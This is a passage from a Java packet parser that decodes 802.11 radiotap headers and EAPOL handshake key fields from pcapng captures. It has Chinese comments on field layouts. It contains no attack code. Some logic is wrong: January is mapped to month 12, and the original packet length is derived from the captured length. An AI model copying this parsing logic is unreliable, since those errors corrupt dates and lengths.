			return "Wifi_Frame_Struct_00000006 EAP_HankShark_Numer= " + getEAPOL_Handshake_Message_Number()
					+ " eap_key_data_length_int=" + eap_key_data_length_int + " " + ", eap_key_length_2bytes="
					+ Arrays.toString(eap_key_length_2bytes) + Arrays.toString(eap_key_length_2bytes)
					+ ", eap_replay_counter_8bytes=" + Arrays.toString(eap_replay_counter_8bytes)
					+ ", eap_wpa_key_nonce_32bytes=" + Arrays.toString(eap_wpa_key_nonce_32bytes)
					+ ", eap_key_iv_16bytes=" + Arrays.toString(eap_key_iv_16bytes) + ", eap_key_rsc_8bytes="
					+ Arrays.toString(eap_key_rsc_8bytes) + ", eap_key_id_8bytes=" + Arrays.toString(eap_key_id_8bytes)
					+ ", eap_key_mic_16bytes=" + Arrays.toString(eap_key_mic_16bytes) + ", eap_key_data_length_2bytes="
					+ Arrays.toString(eap_key_data_length_2bytes) + ", eap_key_data_length_int="
					+ eap_key_data_length_int + ", eap_key_data_bytes=" + Arrays.toString(eap_key_data_bytes)
					+ "[Interface_ID_4bytes=" + Arrays.toString(Interface_ID_4bytes) + ", Timestamp_High_4bytes="
					+ Arrays.toString(Timestamp_High_4bytes) + ", Timestamp_Low_4bytes="
					+ Arrays.toString(Timestamp_Low_4bytes) + ", Captured_Packet_Length_4bytes="
					+ Arrays.toString(Captured_Packet_Length_4bytes) + ", Original_Packet_Length_4bytes="
					+ Arrays.toString(Original_Packet_Length_4bytes) + ", Captured_Packet_Avaliable_Length="
					+ Captured_Packet_Avaliable_Length + ", Original_Packet_Avaliable_Length="
					+ Original_Packet_Avaliable_Length + ", Captured_Packet_Real_Length=" + Captured_Packet_Real_Length
					+ ", Original_Packet_Real_Length=" + Original_Packet_Real_Length + ", Packet_Data_bytes="
					+ Arrays.toString(Packet_Data_bytes) + ", timestamp_str=" + timestamp_str
					+ ", wifi_type_subtype_1byte=" + wifi_type_subtype_1byte + ", wifi_type_int=" + wifi_type_int
					+ ", wifi_subtype_int=" + wifi_subtype_int + ", wifi_control_flag_1byte=" + wifi_control_flag_1byte
					+ ", wifi_is_receive_farme=" + wifi_is_receive_farme + ", wifi_is_protected=" + wifi_is_protected
					+ ", wifi_during_2bytes=" + Arrays.toString(wifi_during_2bytes) + ", wifi_ra_6bytes="
					+ Arrays.toString(wifi_ra_6bytes) + ", wifi_ta_6bytes=" + Arrays.toString(wifi_ta_6bytes)
					+ ", wifi_da_6bytes=" + Arrays.toString(wifi_da_6bytes) + ", wifi_sa_6bytes="
					+ Arrays.toString(wifi_sa_6bytes) + ", wifi_bssid_6bytes=" + Arrays.toString(wifi_bssid_6bytes)
					+ ", wifi_high12bit_SequenceNumber_low4bit_FragmentNumber_2bytes="
					+ Arrays.toString(wifi_high12bit_SequenceNumber_low4bit_FragmentNumber_2bytes)
					+ ", wifi_qos_control_2bytes=" + Arrays.toString(wifi_qos_control_2bytes)
					+ ", wifi_ccmp_paramters_8bytes=" + Arrays.toString(wifi_ccmp_paramters_8bytes)
					+ ", wifi_logical_link_conteolflag_8bytes=" + Arrays.toString(wifi_logical_link_conteolflag_8bytes)
					+ ", wifi_logical_link_type_2bytes=" + Arrays.toString(wifi_logical_link_type_2bytes)
					+ ", wifi_logical_link_type_2bytes_hexstr=" + wifi_logical_link_type_2bytes_hexstr
					+ ", wifi_qos_data_bytes=" + Arrays.toString(wifi_qos_data_bytes)
					+ ", wifi_qosdata_frame_check_sequeue_4bytes="
					+ Arrays.toString(wifi_qosdata_frame_check_sequeue_4bytes) + ", wifi_8021x_auth_version_1byte="
					+ Arrays.toString(wifi_8021x_auth_version_1byte) + ", wifi_8021x_auth_version_int="
					+ wifi_8021x_auth_version_int + ", wifi_8021x_auth_type_1byte="
					+ Arrays.toString(wifi_8021x_auth_type_1byte) + ", wifi_8021x_auth_type_int="
					+ wifi_8021x_auth_type_int + ", wifi_8021x_auth_length_2byte="
					+ Arrays.toString(wifi_8021x_auth_length_2byte) + ", wifi_8021x_auth_length_int="
					+ wifi_8021x_auth_length_int + ", wifi_eapol_auth_data_bytes="
					+ Arrays.toString(wifi_eapol_auth_data_bytes) + ", MultiPresent_IntList_List="
					+ MultiPresent_IntList_List + ", All_RadiotapPresent_IntList=" + All_RadiotapPresent_IntList
					+ ", All_RadiotapPresent_Bit_Desc_Map=" + All_RadiotapPresent_Bit_Desc_Map
					+ ", Option_RadiotapPresent_Bit_ByteArr_Map=" + Option_RadiotapPresent_Bit_ByteArr_Map
					+ ", Option_RadiotapPresent_Bit_ByteLength_Map=" + Option_RadiotapPresent_Bit_ByteLength_Map
					+ ", radiotap_present_tsft_1bit=" + radiotap_present_tsft_1bit + ", radiotap_present_flags_2bit="
					+ radiotap_present_flags_2bit + ", radiotap_present_rate_3bit=" + radiotap_present_rate_3bit
					+ ", radiotap_present_channel_4bit=" + radiotap_present_channel_4bit
					+ ", radiotap_present_fhss_5bit=" + radiotap_present_fhss_5bit
					+ ", radiotap_present_dbm_antsignal_6bit=" + radiotap_present_dbm_antsignal_6bit
					+ ", radiotap_present_db_antnoise_7bit=" + radiotap_present_db_antnoise_7bit
					+ ", radiotap_present_lock_quality_8bit=" + radiotap_present_lock_quality_8bit
					+ ", radiotap_present_tx_attenuation_9bit=" + radiotap_present_tx_attenuation_9bit
					+ ", radiotap_present_db_tx_attenuation_10bit=" + radiotap_present_db_tx_attenuation_10bit
					+ ", radiotap_present_dbm_tx_power_11bit=" + radiotap_present_dbm_tx_power_11bit
					+ ", radiotap_present_antenna_12bit=" + radiotap_present_antenna_12bit
					+ ", radiotap_present_db_antsignal_13bit=" + radiotap_present_db_antsignal_13bit
					+ ", radiotap_present_db_antnoise_14bit=" + radiotap_present_db_antnoise_14bit
					+ ", radiotap_present_rxflags_15bit=" + radiotap_present_rxflags_15bit
					+ ", radiotap_present_txflags_16bit=" + radiotap_present_txflags_16bit
					+ ", radiotap_present_xchannel_19bit=" + radiotap_present_xchannel_19bit
					+ ", radiotap_present_mcs_20bit=" + radiotap_present_mcs_20bit + ", radiotap_present_ampdu_21bit="
					+ radiotap_present_ampdu_21bit + ", radiotap_present_vht_22bit=" + radiotap_present_vht_22bit
					+ ", radiotap_present_timestamp_23bit=" + radiotap_present_timestamp_23bit
					+ ", radiotap_present_he_24bit=" + radiotap_present_he_24bit + ", radiotap_present_he_mu_25bit="
					+ radiotap_present_he_mu_25bit + ", radiotap_present_0_length_psdu_27bit="
					+ radiotap_present_0_length_psdu_27bit + ", radiotap_present_l_sig_28bit="
					+ radiotap_present_l_sig_28bit + ", radiotap_present_tlv_29bit=" + radiotap_present_tlv_29bit
					+ ", radiotap_present_rtap_ns_30bit=" + radiotap_present_rtap_ns_30bit
					+ ", radiotap_present_vendor_ns_31bit=" + radiotap_present_vendor_ns_31bit
					+ ", radiotap_present_ext_32bit=" + radiotap_present_ext_32bit + ", Header_revision_1byte="
					+ Header_revision_1byte + ", Header_pad_1byte=" + Header_pad_1byte + ", Header_length_2bytes="
					+ Arrays.toString(Header_length_2bytes) + ", Header_length_Int=" + Header_length_Int
					+ ", Present_flags_First_32bits_4bytes=" + Arrays.toString(Present_flags_First_32bits_4bytes)
					+ ", Present_BitMsk_First=" + Present_BitMsk_First_Int + ", All_Present_BitMsk="
					+ All_Present_BitMsk + ", Radiotap_Header_bytes=" + Arrays.toString(Radiotap_Header_bytes)
					+ ", option_1bit_radiotap_mactime_8bytes=" + Arrays.toString(option_1bit_radiotap_mactime_8bytes)
					+ ", eap_key_desc_1bytes=" + Arrays.toString(eap_key_desc_1bytes) + ", eap_key_info_2bytes="
					+ Arrays.toString(eap_key_info_2bytes) + "]";
		}

		ArrayList<Integer> All_RadiotapPresent_IntList;

		// 对 bit 位 的 描述
		Map<Integer, String> All_RadiotapPresent_Bit_Desc_Map;;

		// 位置 与对应的字节数组 的Map 有些 没有 Present 那么就 不保存
		// 0 , 1 ,2 对应的 多个 byte[] 数组
		Map<Integer, ArrayList<Byte>> Option_RadiotapPresent_Bit_ByteArr_Map;

		// 各个 bit位 存在 那么 对应的 存在的数据区块的长度
		Map<Integer, Integer> Option_RadiotapPresent_Bit_ByteLength_Map;

		// 32 位 bit位
		int radiotap_present_tsft_1bit = 0x00000001;
		int radiotap_present_flags_2bit = 0x00000002;
		int radiotap_present_rate_3bit = 0x00000004;
		int radiotap_present_channel_4bit = 0x00000008;
		int radiotap_present_fhss_5bit = 0x00000010;
		int radiotap_present_dbm_antsignal_6bit = 0x00000020;
		int radiotap_present_db_antnoise_7bit = 0x00000040;
		int radiotap_present_lock_quality_8bit = 0x00000080;
		int radiotap_present_tx_attenuation_9bit = 0x00000100;
		int radiotap_present_db_tx_attenuation_10bit = 0x00000200;
		int radiotap_present_dbm_tx_power_11bit = 0x00000400;
		int radiotap_present_antenna_12bit = 0x00000800;
		int radiotap_present_db_antsignal_13bit = 0x00001000;
		int radiotap_present_db_antnoise_14bit = 0x00002000;
		int radiotap_present_rxflags_15bit = 0x00004000;
		int radiotap_present_txflags_16bit = 0x00008000;
		// 第 17 第18 个 bit位 是 空的 为啥呢?
		int radiotap_present_xchannel_19bit = 0x00040000;
		int radiotap_present_mcs_20bit = 0x00080000;
		int radiotap_present_ampdu_21bit = 0x00100000;
		int radiotap_present_vht_22bit = 0x00200000;
		int radiotap_present_timestamp_23bit = 0x00400000;
		int radiotap_present_he_24bit = 0x00800000;
		int radiotap_present_he_mu_25bit = 0x01000000;
		// 第26 bit位 是 空的 为啥呢?
		int radiotap_present_0_length_psdu_27bit = 0x04000000;
		int radiotap_present_l_sig_28bit = 0x08000000;
		int radiotap_present_tlv_29bit = 0x10000000;
		int radiotap_present_rtap_ns_30bit = 0x20000000;
		int radiotap_present_vendor_ns_31bit = 0x40000000;
		int radiotap_present_ext_32bit = 0x80000000;

		byte Header_revision_1byte;
		byte Header_pad_1byte;
		byte[] Header_length_2bytes; // 决定了 Radiotap_Header_bytes 的长度
		int Header_length_Int;

		byte[] Present_flags_First_32bits_4bytes;
		int Present_BitMsk_First_Int; // 字节转为的 int值 第一个 present_mask 可能会有多个 所以要解析出多个来
		ArrayList<Integer> All_Present_BitMsk; // 所有的 bitmap的数据

		byte[] Radiotap_Header_bytes;

		byte[] option_1bit_radiotap_mactime_8bytes;

//	════════════════ Radiotap Format End ════════════════

		@Override
		String getBeacon_Identify() {
			if (is_beacon_frame() && ssid_name != null) {
				return ssid_name + "-" + wifi_80211_wireless_management_beacon_channel_hz + "-"
						+ bytesToHex(wifi_bssid_6bytes) + "-" + Arrays.toString(wifi_bssid_6bytes);
			}
			return null;
		}

		@Override
		boolean is_beacon_frame() {
			if (wifi_subtype_int == 8 && wifi_type_int == 0) {
				return true;
			}

			return false;
		}

		void init_prop() {

			init_radiotap_format();

		}

		void init_radiotap_format() {

			All_RadiotapPresent_IntList = new ArrayList<Integer>();

			All_RadiotapPresent_Bit_Desc_Map = new HashMap<Integer, String>();
			MultiPresent_IntList_List = new ArrayList<ArrayList<Integer>>();
			Option_RadiotapPresent_Bit_ByteLength_Map = new HashMap<Integer, Integer>();
			Option_RadiotapPresent_Bit_ByteArr_Map = new HashMap<Integer, ArrayList<Byte>>();
			All_Present_BitMsk = new ArrayList<Integer>();

			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_tsft_1bit,
					"radiotap_present_tsft_1bit              ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_flags_2bit,
					"radiotap_present_flags_2bit             ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_rate_3bit,
					"radiotap_present_rate_3bit              ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_channel_4bit,
					"radiotap_present_channel_4bit           ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_fhss_5bit,
					"radiotap_present_fhss_5bit              ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_dbm_antsignal_6bit,
					"radiotap_present_dbm_antsignal_6bit     ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_db_antnoise_7bit,
					"radiotap_present_db_antnoise_7bit       ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_lock_quality_8bit,
					"radiotap_present_lock_quality_8bit      ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_tx_attenuation_9bit,
					"radiotap_present_tx_attenuation_9bit    ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_db_tx_attenuation_10bit,
					"radiotap_present_db_tx_attenuation_10bi ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_dbm_tx_power_11bit,
					"radiotap_present_dbm_tx_power_11bit     ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_antenna_12bit,
					"radiotap_present_antenna_12bit          ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_db_antsignal_13bit,
					"radiotap_present_db_antsignal_13bit     ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_db_antnoise_14bit,
					"radiotap_present_db_antnoise_14bit      ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_rxflags_15bit,
					"radiotap_present_rxflags_15bit          ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_txflags_16bit,
					"radiotap_present_txflags_16bit          ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_xchannel_19bit,
					"radiotap_present_xchannel_19bit         ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_mcs_20bit,
					"radiotap_present_mcs_20bit              ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_ampdu_21bit,
					"radiotap_present_ampdu_21bit            ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_vht_22bit,
					"radiotap_present_vht_22bit              ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_timestamp_23bit,
					"radiotap_present_timestamp_23bit        ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_he_24bit, "radiotap_present_he_24bit               ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_he_mu_25bit,
					"radiotap_present_he_mu_25bit            ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_0_length_psdu_27bit,
					"radiotap_present_0_length_psdu_27bit    ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_l_sig_28bit,
					"radiotap_present_l_sig_28bit            ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_tlv_29bit,
					"radiotap_present_tlv_29bit              ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_rtap_ns_30bit,
					"radiotap_present_rtap_ns_30bit          ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_vendor_ns_31bit,
					"radiotap_present_vendor_ns_31bit        ");
			All_RadiotapPresent_Bit_Desc_Map.put(radiotap_present_ext_32bit,
					"radiotap_present_ext_32bit              ");

			All_RadiotapPresent_IntList.add(radiotap_present_tsft_1bit);
			All_RadiotapPresent_IntList.add(radiotap_present_flags_2bit);
			All_RadiotapPresent_IntList.add(radiotap_present_rate_3bit);
			All_RadiotapPresent_IntList.add(radiotap_present_channel_4bit);
			All_RadiotapPresent_IntList.add(radiotap_present_fhss_5bit);
			All_RadiotapPresent_IntList.add(radiotap_present_dbm_antsignal_6bit);
			All_RadiotapPresent_IntList.add(radiotap_present_db_antnoise_7bit);
			All_RadiotapPresent_IntList.add(radiotap_present_lock_quality_8bit);
			All_RadiotapPresent_IntList.add(radiotap_present_tx_attenuation_9bit);
			All_RadiotapPresent_IntList.add(radiotap_present_db_tx_attenuation_10bit);
			All_RadiotapPresent_IntList.add(radiotap_present_dbm_tx_power_11bit);
			All_RadiotapPresent_IntList.add(radiotap_present_antenna_12bit);
			All_RadiotapPresent_IntList.add(radiotap_present_db_antsignal_13bit);
			All_RadiotapPresent_IntList.add(radiotap_present_db_antnoise_14bit);
			All_RadiotapPresent_IntList.add(radiotap_present_rxflags_15bit);
			All_RadiotapPresent_IntList.add(radiotap_present_txflags_16bit);
			All_RadiotapPresent_IntList.add(radiotap_present_xchannel_19bit);
			All_RadiotapPresent_IntList.add(radiotap_present_mcs_20bit);
			All_RadiotapPresent_IntList.add(radiotap_present_ampdu_21bit);
			All_RadiotapPresent_IntList.add(radiotap_present_vht_22bit);
			All_RadiotapPresent_IntList.add(radiotap_present_timestamp_23bit);
			All_RadiotapPresent_IntList.add(radiotap_present_he_24bit);
			All_RadiotapPresent_IntList.add(radiotap_present_he_mu_25bit);
			All_RadiotapPresent_IntList.add(radiotap_present_0_length_psdu_27bit);
			All_RadiotapPresent_IntList.add(radiotap_present_l_sig_28bit);
			All_RadiotapPresent_IntList.add(radiotap_present_tlv_29bit);
			All_RadiotapPresent_IntList.add(radiotap_present_rtap_ns_30bit);
			All_RadiotapPresent_IntList.add(radiotap_present_vendor_ns_31bit);
			All_RadiotapPresent_IntList.add(radiotap_present_ext_32bit);

			// length=0 的 意味着 这个值标识的是 boolean
			// https://oomake.com/question/3948105
			// https://www.radiotap.org/fields/XChannel.html
			// https://www.radiotap.org/fields/MCS.html
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_tsft_1bit, 8);// .... .... .... .... ....
			// .... .... ...1 = TSFT:
			// radiotap.present.tsft ==
			// 1 【包含字段 radiotap.mactime
			// 08字节 】 #接收到数据包的时间戳单位毫秒
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_flags_2bit, 1);// .... .... .... .... ....
			// .... .... ..1. = Flags:
			// radiotap.present.flags ==
			// 1 【包含字段 radiotap.flags
			// 01字节-8比特位】 #标记
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_rate_3bit, 1);// .... .... .... .... ....
			// .... .... .1.. = Rate:
			// radiotap.present.rate ==
			// 1 【包含字段 radiotap.datarate
			// 01字节】 #速度
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_channel_4bit, 4);// .... .... .... .... ....
			// .... .... 1... = Channel:
			// radiotap.present.channel
			// == 1 【包含字段
			// radiotap.channel.freq 2字节
			// radiotap.channel.flags
			// 2字节 共4字节】#信道
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_fhss_5bit, 2);// .... .... .... .... ....
			// .... ...0 .... = FHSS:
			// radiotap.present.fhss ==
			// 1 布尔值 #跳频技术
			// 【radiotap.fhss.hopset 1字节
			// radiotap.fhss.pattern 1字节
			// 共2字节】
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_dbm_antsignal_6bit, 1);// .... .... .... ....
			// .... .... ..1.
			// .... = dBm
			// Antenna Signal:
			// radiotap.present.dbm_antsignal
			// == 1 【包含字段
			// radiotap.dbm_antsignal
			// 1字节】 #天线信号
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_db_antnoise_7bit, 1);// .... .... .... ....
			// .... .... .0.. .... =
			// dBm Antenna Noise:
			// Boolean
			// radiotap.present.db_antnoise
			// == 1 【1字节】 #天线噪声
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_lock_quality_8bit, 2);// .... .... .... ....
			// .... .... 0...
			// .... = Lock
			// Quality: Boolean
			// radiotap.present.lock_quality
			// == 1 【2字节】 Barker
			// Lock的质量. 单调不降低,
			// 锁定强度更高.
			// 数据表中称为“信号质量”
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_tx_attenuation_9bit, 2);// .... .... ....
			// .... .... ...0
			// .... .... = TX
			// Attenuation:
			// Boolean无数据
			// radiotap.present.tx_attenuation
			// == 1 【2字节】 u16
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_db_tx_attenuation_10bit, 2);// .... .... ....
			// .... ....
			// ..0. ....
			// .... = dB TX
			// Attenuation:
			// Boolean无数据
			// 【2字节】 u16
			// radiotap.present.db_tx_attenuation
			// == 1
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_dbm_tx_power_11bit, 1);// .... .... .... ....
			// .... .0.. ....
			// .... = dBm TX
			// Power:
			// radiotap.present.dbm_tx_power
			// == 1 【包含字段
			// radiotap.不知道
			// 01字节】
			// 发射功率以dBm(1毫瓦参考分贝)表示.
			// 这是在天线端口测量的绝对功率电平
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_antenna_12bit, 1);// .... .... .... .... ....
			// 1... .... .... =
			// Antenna:
			// radiotap.present.antenna
			// == 1 【包含字段
			// radiotap.antenna
			// 01字节】 #天线
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_db_antsignal_13bit, 1);// .... .... .... ....
			// ...0 .... ....
			// .... = dB Antenna
			// Signal:
			// radiotap.present.db_antsignal
			// == 1 【1字节】
			// 天线处的RF信号功率,
			// 与任意固定参考之间的分贝差
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_db_antnoise_14bit, 1);// .... .... .... ....
			// ..0. .... ....
			// .... = dB Antenna
			// Noise:
			// radiotap.present.db_antnoise
			// == 1 【1字节】
			// 天线的RF噪声功率,
			// 与任意固定参考之间的分贝差.
			// 该字段包含单个无符号的8位值
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_rxflags_15bit, 2);// .... .... .... .... .1..
			// .... .... .... = RX
			// flags:
			// radiotap.present.rxflags
			// == 1 【包含字段
			// radiotap.rxflags
			// 02字节】 #接收标识
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_txflags_16bit, 3);// .... .... .... .... 0...
			// .... .... .... = TX
			// flags:
			// radiotap.present.txflags
			// == 1 【包含字段
			// radiotap.txflags
			// 02字节】#发送标识 暂时
			// 默认后面会带有一个1个字节的 奇怪点
			// 2或3 unknown TLV data:
			// 00
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_xchannel_19bit, 8);// .... .... .... .0..
			// .... .... .... .... =
			// Channel+:
			// radiotap.present.xchannel
			// == 1 【8字节】 u32 flags,
			// u16 freq, u8 channel,
			// u8 maxpower
			// https://www.radiotap.org/fields/XChannel.html
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_mcs_20bit, 3);// .... .... .... 0... ....
			// .... .... .... = MCS
			// information:
			// radiotap.present.mcs == 1
			// 【包含字段 radiotap.mcs 03字节】
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_ampdu_21bit, 8);// .... .... ...0 .... ....
			// .... .... .... = A-MPDU
			// Status:
			// radiotap.present.ampdu ==
			// 1 【8字节】 u32 reference
			// number, u16 flags, u8
			// delimiter CRC value, u8
			// reserved ## Aggregate
			// MPDU, MPDU 帧聚合
			// 进一步提高效率和可靠性,增加了MPDU帧的大小和A-MPDU帧的大小
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_vht_22bit, 8);// .... .... ..0. .... ....
			// .... .... .... = VHT
			// information:
			// radiotap.present.vht == 1
			// 【8字节】 u16 known, u8
			// flags, u8 bandwidth, u8
			// mcs_nss[4], u8 coding, u8
			// group_id, u16 partial_aid
			// ## very high traslation
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_timestamp_23bit, 12);// .... .... .0.. ....
			// .... .... .... .... =
			// frame timestamp:
			// radiotap.present.timestamp
			// == 1 u64 timestamp,
			// u16 accuracy, u8
			// unit/position, u8
			// flags 【包含字段
			// radiotap.timestamp
			// timestampinfo-12字节(
			// timestamp8+ accuracy2
			// +unit2)】
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_he_24bit, 12);// .... .... 0... .... ....
			// .... .... .... = HE
			// information:
			// radiotap.present.he == 1
			// 【12字节】u16 data1, data2,
			// data3, data4, data5,
			// data6 多选
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_he_mu_25bit, 6);// .... ...0 .... .... ....
			// .... .... .... = HE-MU
			// information:
			// radiotap.present.he_mu ==
			// 1 【6字节】 u16 flags1 u16
			// flags2 u8 RU_channel1[4]
			// u8 RU_channel2[4]
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_0_length_psdu_27bit, 1);// .... .0.. ....
			// .... .... ....
			// .... .... = 0
			// Length PSDU:
			// radiotap.present.0_length.psdu
			// == 1 【1字节】u8 type
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_l_sig_28bit, 4);// .... 0... .... .... ....
			// .... .... .... = L-SIG:
			// radiotap.present.l_sig ==
			// 1 【4字节】 u16 data1, data2
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_tlv_29bit, 0);// ...0 .... .... .... ....
			// .... .... .... = TLVs:
			// radiotap.present.tlv == 1
			// 类型-长度-值 的结构动态解析
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_rtap_ns_30bit, 0);// ..0. .... .... .... ....
			// .... .... .... =
			// Radiotap NS next:
			// Boolean无数据
			// radiotap.present.rtap_ns
			// == 1【未包含显示字段
			// 标记属性为True False 】
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_vendor_ns_31bit, 0);// .0.. .... .... ....
			// .... .... .... .... =
			// Vendor NS next:
			// Boolean无数据
			// radiotap.present.vendor_ns
			// == 1【未包含显示字段
			// 标记属性为True False 】
			Option_RadiotapPresent_Bit_ByteLength_Map.put(radiotap_present_ext_32bit, 0);// 0... .... .... .... ....
			// .... .... .... = Ext:
			// Boolean无数据
			// 标识是否还有present存在了
			// 多个present_flag
			// radiotap.present.ext == 1
			// 【present中的Ext代表着还有另外的present字段存在】

		}

		ArrayList<Byte> byteArr2List(byte[] bytearr) {
			ArrayList<Byte> ByteList = new ArrayList<Byte>();
			for (int i = 0; i < bytearr.length; i++) {
				ByteList.add(bytearr[i]);
			}
			return ByteList;
		}

		byte[] byteList2Arr(ArrayList<Byte> byteList) {
			byte[] byteArr = new byte[byteList.size()];
			for (int i = 0; i < byteList.size(); i++) {
				byteArr[i] = byteList.get(i);
			}
			return byteArr;
		}

		void Block_Format_Parser(byte[] all_frame) {

			Interface_ID_4bytes = beginIndex_endIndex_byteArr(all_frame, 8, 11);

			Captured_Packet_Length_4bytes = beginIndex_endIndex_byteArr(all_frame, 20, 23);
			Original_Packet_Length_4bytes = beginIndex_endIndex_byteArr(all_frame, 24, 27);
			Packet_Data_bytes = beginIndex_endIndex_byteArr(all_frame, 28, (frame_length - 4 - 1));

			String Captured_Packet_Length_4bytes_hexstr = DigitalTransUtils.byte2hex(Captured_Packet_Length_4bytes,
					true);
			// 将16进制字符串转为10进制的int（注意字符串不要以f开头，如有要先处理为0）

//				    System.out.println("Captured_Packet_Length_4bytes_hexstr = "+ Captured_Packet_Length_4bytes_hexstr +" Captured_Packet_Length_4bytes ="+Arrays.toString(Captured_Packet_Length_4bytes) );
			Captured_Packet_Avaliable_Length = Integer
					.parseInt(clearZero_for_NumberStr(Captured_Packet_Length_4bytes_hexstr), 16);

			Captured_Packet_Real_Length = getRealLength_From_AvaliableLength(Captured_Packet_Avaliable_Length);

			String Original_Packet_Length_4bytes_hexstr = DigitalTransUtils.byte2hex(Original_Packet_Length_4bytes,
					true);
			System.out.println("Original_Packet_Length_4bytes_hexstr = " + Original_Packet_Length_4bytes_hexstr
					+ " Original_Packet_Length_4bytes =" + Arrays.toString(Original_Packet_Length_4bytes));
			// 将16进制字符串转为10进制的int（注意字符串不要以f开头，如有要先处理为0）
			Original_Packet_Avaliable_Length = Integer
					.parseInt(clearZero_for_NumberStr(Original_Packet_Length_4bytes_hexstr), 16);

			Original_Packet_Real_Length = getRealLength_From_AvaliableLength(Captured_Packet_Avaliable_Length);

			Timestamp_High_4bytes = beginIndex_endIndex_byteArr(all_frame, 12, 15);
			Timestamp_Low_4bytes = beginIndex_endIndex_byteArr(all_frame, 16, 19);

			// TimeStamp 时间戳 Begin ════════════════════════════════════
//		         		toUnsignedString
			byte[] long_time_ms = { Timestamp_High_4bytes[3], Timestamp_High_4bytes[2], Timestamp_High_4bytes[1],
					Timestamp_High_4bytes[0], Timestamp_Low_4bytes[3], Timestamp_Low_4bytes[2], Timestamp_Low_4bytes[1],
					Timestamp_Low_4bytes[0] };

			// long=1396710020795381 微妙
			// long=1560950936695086634 纳秒
			// 以 10(-6)次方 微妙 为单位
			long long_time_stamp = bytesToLong(long_time_ms, 0, false);
			String long_time_stamp_test = "" + long_time_stamp;
			long long_time_stamp_ws = 0; // 微妙
			long long_time_stamp_ms = 0; // 毫秒

			if (long_time_stamp_test.length() >= "1560950936695086634".length()) {
				// 以 纳秒为单位
				long_time_stamp_ws = (long) (long_time_stamp % 1000000000L);
				long_time_stamp_ms = (long_time_stamp - long_time_stamp_ws) / 1000000;

			} else { // 以 微秒为单位

				long_time_stamp_ws = (long) (long_time_stamp % 1000000L);
				// long=1396710020795381 ws=795381 转为 毫秒 需要再 除以 1000
				long_time_stamp_ms = (long_time_stamp - long_time_stamp_ws) / 1000;
			}

			Calendar stampCalendar = Calendar.getInstance();
			stampCalendar.setTimeInMillis(long_time_stamp_ms);

			int year_8 = stampCalendar.get(Calendar.YEAR);
			String year_8_str = year_8 + "";

			int month_8 = (stampCalendar.get(Calendar.MONTH) == 0 ? 12 : (stampCalendar.get(Calendar.MONTH) + 1));

			String month_8_str = (month_8 > 9 ? month_8 + "" : "0" + month_8);

			int day_8 = stampCalendar.get(Calendar.DAY_OF_MONTH);
			String day_8_str = day_8 + "";
			if (day_8 < 10) {
				day_8_str = "0" + day_8;
			}

			int hour_8 = stampCalendar.get(Calendar.HOUR_OF_DAY);
			String hour_8_str = hour_8 + "";
			if (hour_8 < 10) {
				hour_8_str = "0" + hour_8;
			}

			int minute_8 = stampCalendar.get(Calendar.MINUTE);

			String minute_8_str = minute_8 + "";
			if (minute_8 < 10) {
				minute_8_str = "0" + minute_8;
			}

			int second_8 = stampCalendar.get(Calendar.SECOND);

